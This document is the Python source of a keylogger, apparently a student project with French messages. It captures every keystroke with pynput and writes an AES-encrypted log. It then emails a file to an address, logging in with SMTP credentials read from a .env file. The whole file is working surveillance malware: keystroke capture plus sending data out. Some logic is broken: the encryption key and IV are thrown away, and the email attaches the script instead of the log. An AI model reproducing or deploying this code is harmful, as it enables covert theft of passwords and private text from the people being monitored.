import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from plyer import notification 
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad


text = []

class Notifier():
    def notify(self, title, message):
        notification.notify(
            title=title,
            message=message,
            app_icon='keylogger-master\eye of the herald.ico',  
            timeout=10
        )

toast = Notifier()
toast.notify('Tracer tout', 'Keylogger en cours d éxecution.')

def listItemReplace(string, unwanted_string, wanted_string):
    while True:
        if unwanted_string in string:
            index = string.index(unwanted_string)
            string.remove(unwanted_string)
            string.insert(index, wanted_string)
        else:
            break

    return string

def backspace_purge():
    global text
    for item in text:
        if item == 'Key.backspace':
            index = text.index(item)
            print('backspace detected')
            print(text[index - 2: index + 2])
            text.pop(index)
            print(text[index - 2: index + 2])
            try:
                text.pop(index - 1)
                print(text[index - 2: index + 2])
            except:
                pass
            backspace_purge()



def encrypt(text, key):
    cipher = AES.new(key, AES.MODE_CBC, get_random_bytes(16))
    ciphertext = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return ciphertext

def envoyer_email():
    # Read values directly from the .env file
    with open('keylogger-master\.env', 'r') as env_file:
        lines = env_file.readlines()
        from_address = lines[0].split('=')[1].strip()
        to_address = lines[1].split('=')[1].strip()
        smtp_server = lines[2].split('=')[1].strip()
        smtp_port = int(lines[3].split('=')[1].strip())
        smtp_username = lines[4].split('=')[1].strip()
        smtp_password = lines[5].split('=')[1].strip()

    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = 'Rapport Keylogger'

    body = 'Ce mail contient un rapport des caractères élaborés.'
    msg.attach(MIMEText(body, 'plain'))

    filename = 'keylogger-master\keylogger.py'
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Use starttls() for TLS
        server.login(smtp_username, smtp_password)
        server.sendmail(from_address, to_address, msg.as_string())
        server.quit()
        print("Un Email a été envoyé contenant les caractères écris.")
    except Exception as e:
        print("L'email n'a pas été envoyé!", str(e))

def on_press(key):
    global text
    print(key)
    try:
        text.append(key.char)
    except AttributeError:
        text.append(str(key))

    if key == Key.esc:
        with open('keylogger-master\keylog_info.txt', 'wb') as f:
            for i in range(10):
                print(text)

            text = listItemReplace(text, 'Key.space', ' ')
            text = listItemReplace(text, 'Key.tab', '    ')
            text = listItemReplace(text, 'Key.enter', '\n')
            text = listItemReplace(text, 'Key.shift', '')
            text = listItemReplace(text, 'Key.caps_lock', '\nThe user pressed caps lock.\n')
            text = listItemReplace(text, 'Key.alt_l', '\nThe user pressed the left alt key.\n')
            text = listItemReplace(text, 'Key.alt_r', '\nThe user pressed the right alt key.\n')

            print(len(text))
            backspace_purge()
            print(len(text))
            secret_key = get_random_bytes(32)
            encrypted_text = encrypt("".join(text), secret_key)
            f.write(encrypted_text)


        return False

with Listener(on_press=on_press) as listener:
    listener.join()


envoyer_email()

